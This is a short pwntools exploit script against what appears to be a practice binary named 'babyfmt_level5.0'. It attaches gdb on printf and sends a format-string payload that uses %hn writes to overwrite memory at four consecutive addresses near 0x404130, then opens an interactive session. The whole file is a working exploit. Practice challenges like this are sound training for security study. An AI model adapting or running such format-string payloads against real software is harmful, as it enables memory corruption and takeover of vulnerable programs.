from pwn import * 

binary = './babyfmt_level5.0'

p = process(binary)

s = '''
b * printf
'''



gdb.attach(p, s)


payload = flat(
	"%44202c%26$hn",
	"%30729c%2",
	"7$hn%266",
	"32c%28$h",
	"n%62338c",
	"%29$hn---------",
	"\x30\x41\x40\x00\x00\x00\x00\x00",
	"\x32\x41\x40\x00\x00\x00\x00\x00",
	"\x34\x41\x40\x00\x00\x00\x00\x00",
	"\x36\x41\x40\x00\x00\x00\x00\x00"

)
p.sendline(payload)





p.interactive()
